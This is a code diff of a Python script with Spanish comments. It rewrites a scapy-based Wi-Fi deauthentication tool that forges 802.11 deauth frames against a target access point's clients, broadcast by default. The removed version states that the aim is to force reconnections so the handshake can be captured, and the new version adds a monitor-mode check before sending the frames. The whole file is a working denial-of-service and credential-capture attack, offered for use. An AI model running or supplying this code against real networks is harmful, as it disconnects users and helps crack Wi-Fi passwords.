@@ -1,21 +1,25 @@
-"""Envío de tramas deauthentication para forzar reconexión (captura de handshake)."""
+from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
+import subprocess
 import time
 
-def send_deauth(interface, bssid, client="ff:ff:ff:ff:ff:ff", count=10, interval=0.1):
-    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
-    print(f"[*] Enviando {count} deauth a {client} desde {bssid}...")
-    pkt = (
-        RadioTap()
-        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
-        / Dot11Deauth(reason=7)
-    )
-    sendp(pkt, iface=interface, count=count, inter=interval, verbose=False)
-    print("[✓] Deauth enviados.")
+def check_monitor(interface):
+    result = subprocess.run(['iw', 'dev', interface],
+                            capture_output=True, text=True)
+    return 'type monitor' in result.stdout
 
-def deauth_loop(interface, bssid, client="ff:ff:ff:ff:ff:ff", bursts=20, burst_interval=5):
-    """Envía ráfagas repetidas durante un ataque de handshake."""
-    for i in range(bursts):
-        send_deauth(interface, bssid, client, count=5, interval=0.05)
-        print(f"  [{i+1}/{bursts}] ráfaga enviada")
-        time.sleep(burst_interval)
+
+def send_deauth(interface, bssid, client='ff:ff:ff:ff:ff:ff',
+                count=20, interval=0.1):
+    if not check_monitor(interface):
+        raise RuntimeError(f"La interfaz {interface} no está en modo monitor.")
+
+    pkt = (RadioTap()
+           / Dot11(addr1=client, addr2=bssid, addr3=bssid)
+           / Dot11Deauth(reason=7))
+
+    print(f"[*] Enviando {count} tramas deauth a {client} desde {bssid}...")
+    for _ in range(count):
+        sendp(pkt, iface=interface, verbose=False)
+        time.sleep(interval)
+    print("[+] Ataque deauth finalizado.")
